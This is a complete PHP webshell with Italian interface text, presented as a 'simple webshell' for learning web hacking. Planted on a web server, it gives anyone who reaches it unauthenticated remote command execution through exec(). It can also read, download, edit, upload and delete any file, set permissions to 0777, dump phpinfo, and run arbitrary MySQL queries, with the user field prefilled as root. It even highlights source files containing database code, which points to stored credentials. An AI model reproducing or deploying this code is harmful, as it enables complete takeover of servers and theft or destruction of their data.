<html><head><title>Semplice webshell</title></head><body bgcolor="#4d525b"> 

<font color="#33c5d6"><center>Coded by Gorate</center> 
<font color="#33c5d6">   <center> Semplice webshell : alle basi del web hacking </center> 
<?php

function isLinux($path)
{
    return (substr($path,0,1)=="/" ? true : false);
}
function getSlashDir($isLinux)
{
    return($isLinux ? '/' : '\\');
}
$cwd=getcwd();
$isLinux=isLinux($cwd);
if(!$isLinux)
{
    $driveLetter=substr($cwd,0,1);
}
$slash=getSlashDir($isLinux);
$parts=explode($slash,$cwd);
$rootDir=($isLinux ? $slash : ($driveLetter . ':' . $slash));
function cleanPath($path,$isLinux)
{
    $slash=getSlashDir($isLinux);
    $parts=explode($slash,$path);
    foreach($parts as $key=>$val)
    {
        if($val=="..")
        {
            $parts[$key]="";
            $lastKey=$key-1;
            $parts[$lastKey]="";
        }
        elseif($val==".")
        {
            $parts[$key]="";
        }
    }
    reset($parts);
    $fixedPath=($isLinux ? "/" : "");
    $firstPiece=true;
    foreach($parts as $val)
    {
        if($val != "")
        {
            $fixedPath .=  ($firstPiece ? '' : $slash) . $val;
            $firstPiece=false;
        }
    }
    if($fixedPath=="")
    {
        $fixedPath=($isLinux ? $slash : ($driveLetter . ":" . $slash));
    }
    
    if(substr($fixedPath,-1)!=$slash)
        $fixedPath .= $slash;
    return $fixedPath;
}
if(isset($_REQUEST['chm']))
{
    if(!$isLinux)
    {
        echo "Quste funzionalita' e' eseguibile solo su Linux";
    }
    else
    {
        echo (@chmod ( $_REQUEST['chm'] , 0777 ) ? "Permessi riassegnati" : "Impossibile riassegnare i permessi");
    }
}
elseif(isset($_REQUEST['phpinfo']))
{
    phpinfo();
}
elseif(isset($_REQUEST['dl']))
{
    if(@fopen($_REQUEST['dl'] .  $_REQUEST['file'],'r')==true)
    {
        $_REQUEST['dl'] .= $_REQUEST['file'];
        if(substr($_REQUEST['dl'],0,1)==$slash)
            $fileArr=explode($slash,$_REQUEST['dl']);
        
        header('Content-disposition: attachment; filename=' . $_REQUEST['file']);
        header('Content-type: application/octet-stream');
        readfile($_REQUEST['dl']);
    }
    else
    {
        echo $_REQUEST['dl'];
    }
}
elseif(isset($_REQUEST['f']))
{
    $filename=$_REQUEST['f'];
    $file=fopen("$filename","rb");
        header("Content-Type: text/plain");
    fpassthru($file);
}
elseif(isset($_REQUEST['d']))
{
    $d=$_REQUEST['d'];
    echo "<pre>";
    if ($handle = opendir("$d")) 
    {
        echo "<h2>listing of ";
        $conString="";
        if($isLinux)
            echo "<a href='?d=$slash'>$slash</a>";
        foreach(explode($slash,cleanPath($d,$isLinux)) as $val)
        {
            $conString .= $val . $slash;
            echo "<a href='?d=$conString'>" . $val . "</a>" . ($val != "" ? $slash : '');
        }
        echo " (<a target='_blank' href='?uploadForm=1&dir=" . urlencode(cleanPath($d,$isLinux)) . "'>upload file</a>) (<a href='?d=" . urlencode(cleanPath($d,$isLinux)) . "&hldb=1'>DB interaction</a>)</h2><br />";
        while ($dir = readdir($handle))
        { 
            if (is_dir("$d$slash$dir")) 
            {
                if($dir != "." && $dir !="..")
                    $dirList[]=$dir;
            }
            else
            {
                if(isset($_REQUEST["hldb"]))
                {
                    $contents=file_get_contents("$d$slash$dir");
                    if (stripos($contents, "mysql_") || stripos($contents, "mysqli_") || stripos($contents, "SELECT "))
                    {
                        $fileList[]=array('dir'=>$dir,'color'=>'red');
                    }
                    else
                    {
                        $fileList[]=array('dir'=>$dir,'color'=>'black');
                    }
                }
                else
                {
                    $fileList[]=array('dir'=>$dir,'color'=>'black');
                }
            }
        }
        
        echo "<a href='?d=$d$slash.'><font color=grey>.\n</font></a>";
        echo "<a href='?d=$d$slash..'><font color=grey>..\n</font></a>";
        
        if(isset($dirList))
        if(is_array($dirList))
        foreach($dirList as $dir)
        {
                echo "<a href='?d=$d$slash$dir'><font color=grey>$dir\n</font></a>";
        }
        
        if(isset($fileList))
        if(is_array($fileList))
        foreach($fileList as $dir)
        {
            echo "<a href='?f=$d" . $slash . $dir['dir'] . "'><font color=" . $dir['color'] . ">" . $dir['dir'] . "</font></a>" . 
                 "|<a href='?dl=" . cleanPath($d,$isLinux) . '&file=' .$dir["dir"] . "' target='_blank'>Download</a>|" . 
                 "|<a href='?ef=" . cleanPath($d,$isLinux) . '&file=' .$dir["dir"] . "' target='_blank'>Modifica</a>|" . 
                 "|<a href='?df=" . cleanPath($d,$isLinux) . '&file=' .$dir["dir"] . "' target='_blank'>Elimina</a>| \n";
        }
    } 
    else 
    echo "opendir() failed";
    closedir($handle);
}
elseif(isset($_REQUEST['c']))
{
    if( @ini_get('safe_mode') )
    {
        echo 'Modalita salva server attiva: comandi eseguiti sotto escape<br />';
    }
    echo "<b>Command: <I>" . $_REQUEST['c'] . "</I></b><br /><br />";
    trim(exec($_REQUEST['c'],$return));
    foreach($return as $val)
    {
        echo '<pre>' . htmlentities($val) . '</pre>';
    }
}
elseif(isset($_REQUEST['uploadForm']) || isset($_FILES["file_name"]))
{
    if(isset($_FILES["file_name"]))
    {
        if ($_FILES["file_name"]["error"] > 0)
        {
                echo "Error";
        }
        else
        {
            $target_path = $_COOKIE["uploadDir"];
            if(substr($target_path,-1) != "/")
                $target_path .= "/";
            
            $target_path = $target_path . basename( $_FILES['file_name']['name']); 
            if(move_uploaded_file($_FILES['file_name']['tmp_name'], $target_path)) {
                setcookie("uploadDir","");
                echo "The file ".  basename( $_FILES['file_name']['name']). 
                " has been uploaded";
            } 
            else
            {
                echo "Impossibile copiare i files, permission denied";
            }
        }
    }
    else
    {       
        ?>
        <form target="_blank" action="" method="GET">
            <input type="hidden" name="cc" value="1" />
            :<br />
            Upload Directory: <input type="text" name="dir" value="<?php echo $_REQUEST["dir"] ?>"><br />
            <input type="submit" value="submit" />
        </form>
        <br /><br />
        
        <form enctype="multipart/form-data" action="" method="post">
        Upload file:<input name="file_name" type="file"> <input type="submit" value="Upload" /></form>

        <?php
    }
}
elseif(isset($_REQUEST['cc']))
{
    setcookie("uploadDir",$_GET["dir"]);
    echo "Upload in esecuzione, non compiere altri upload e non spostarti dalla pagina fino alla fine dell' upload";
}
elseif(isset($_REQUEST['mquery']))
{
    $host=$_REQUEST['host'];
    $usr=$_REQUEST['usr'];
    $passwd=$_REQUEST['passwd'];
    $db=$_REQUEST['db'];
    $mquery=$_REQUEST['mquery'];
    @mysql_connect($host, $usr, $passwd) or die("Connection Error: " . mysql_error());
    mysql_select_db($db);
    $result = mysql_query($mquery);
    if($result!=false)
    {
        echo "<h2>Le query sono state eseguite con successo</h2>" . htmlentities($mquery) . "<br /><br />";
        echo "Ritorna risultato:<br />";
        $first=true;
        echo "<table border='1'>";
        while ($row = mysql_fetch_array($result,MYSQL_ASSOC))
        {
            if($first)
            {
                echo "<tr>";
                foreach($row as $key=>$val)
                {
                    echo "<td><b>$key</b></td>";
                }
                echo "</tr>";
                reset($row);
                $first=false;
            }
            echo "<tr>";
            foreach($row as $val)
            {
                echo "<td>$val</td>";
            }
            echo "</tr>";
        }
        echo "</table>";
        mysql_free_result($result);
    }
    else
    {
        echo "Errore di Query: " . mysql_error();
    }
}
elseif(isset($_REQUEST['df']))
{
    $_REQUEST['df'] .= $slash . $_REQUEST['file'];
    if(@unlink($_REQUEST['df']))
    {
            echo "File eliminato con successo";
    }
    else
    {
            echo "Impossibile eliminare il file";
    }
}
elseif(isset($_REQUEST['ef']))
{
?>
<script type="text/javascript">
  <!--
  var key = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
  function encode64(inpStr) 
  {
     inpStr = escape(inpStr);
     var output = "";
     var chr1, chr2, chr3 = "";
     var enc1, enc2, enc3, enc4 = "";
     var i = 0;
     do {
        chr1 = inpStr.charCodeAt(i++);
        chr2 = inpStr.charCodeAt(i++);
        chr3 = inpStr.charCodeAt(i++);
        enc1 = chr1 >> 2;
        enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
        enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
        enc4 = chr3 & 63;
        if (isNaN(chr2)) 
        {
           enc3 = enc4 = 64;
        } 
        else if (isNaN(chr3)) 
        {
           enc4 = 64;
        }
        output = output +
           key.charAt(enc1) +
           key.charAt(enc2) +
           key.charAt(enc3) +
           key.charAt(enc4);
        chr1 = chr2 = chr3 = enc1 = enc2 = enc3 = enc4 = "";
     } while (i < inpStr.length);
     return output;
  }
  //--></script>

  <?php
    $_REQUEST['ef'] .= $_REQUEST['file']; 
    if(isset($_POST["newcontent"]))
    {
        $_POST["newcontent"]=urldecode(base64_decode($_POST["newcontent"]));
        $stream=@fopen($_REQUEST['ef'],"w");
        
        if($stream)
        {
            fwrite($stream,$_POST["newcontent"]);
            echo "Scrittura del file avvenuta con successo";
        }
        else
        {
            echo "Impossibile scrivere il file";
        }
        fclose($stream);
    }
    ?>
    <form action="" name="f" method="POST">
    <textarea wrap="off" rows="40" cols="130" name="newcontent"><?php echo file_get_contents($_REQUEST['ef']) ?></textarea><br />
    <input type="submit" value="I base64 encoded it myself, dont run script" /><br />
    <input type="submit" value="Modifica (requires javascript to work)"  onclick="document.f.newcontent.value=encode64(document.f.newcontent.value);" />
    </form>
    <?php
}
else
{
?>
<b>Server Information:</b><br />
<i>
Sistema Operativo: <?php echo PHP_OS ?><br />
Versione PHP: <?php echo PHP_VERSION ?><br />
<a href="?phpinfo=true">Vedi phpinfo</a>
</i>
<br />
<br />
<b>Navigazione delle Directory</b><br />
<a href="?d=<?php echo getcwd() ?>"><b>Vai alla directory del server</b></a> <br />
<a href="?d=<?php echo $rootDir ?>"><b>Vai alla directory admin</b></a> <br />
<b>Vai in una directory:</b> <form action="" method="GET"><input type="text" name="d" value="<?php echo $rootDir ?>" /><input type="submit" value="Go" /></form>



<hr>Esegui MySQL Query:
<form action="" METHOD="GET" >
<table>
<tr><td>host</td><td><input type="text" name="host"value="localhost"> </td></tr>
<tr><td>user</td><td><input type="text" name="usr" value="root"> </td></tr>
<tr><td>password</td><td><input type="text" name="passwd"> </td></tr>
<tr><td>database</td><td><input type="text" name="db"> </td></tr>
<tr><td valign="top">query</td><td><textarea name="mquery" rows="6" cols="65"></textarea> </td></tr>
<tr><td colspan="2"><input type="submit" value="execute"></td></tr>
</table>
</form>
<hr>
<pre><form action="" METHOD="GET" >Esegui comandi dalla shell (safe mode e'  <?php echo (@ini_get('safe_mode') ? 'on' : 'off') ?>): <input type="text" name="c"><input type="submit" value="Go"></form> 
<?php
}